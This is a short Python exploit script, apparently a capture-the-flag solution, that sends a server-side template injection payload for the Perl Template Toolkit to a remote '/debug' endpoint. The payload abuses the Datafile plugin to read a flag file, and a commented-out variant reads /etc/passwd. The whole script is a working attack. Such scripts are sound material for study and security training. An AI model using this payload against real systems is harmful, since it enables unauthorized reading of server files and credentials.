import httpx

# BASE_URL = "http://localhost:3000"
BASE_URL = "http://k9zgk12jeksitnbjoxmdues6xgsxml.terjanq.me:9090/"

client = httpx.Client(base_url=BASE_URL)

# https://github.com/abw/Template2/blob/v3.101/lib/Template/Plugin/Datafile.pm
debug = """
[% USE data = datafile('flag_980aef6e461ca1009ea62da051753b38.txt', delim = ' ') %]
[% FOREACH record = data %]
    [% record.Here %]
[% END %]
"""

# # Read /etc/passwd
# debug = """
# [% USE data = datafile('/etc/passwd', delim = ':') %]
# [% FOREACH record = data %]
#     [% record.root %]
# [% END %]
# """

res = client.post(
    "/debug",
    data={
        "debug": debug,
    },
    timeout=20,
)
print(res.text)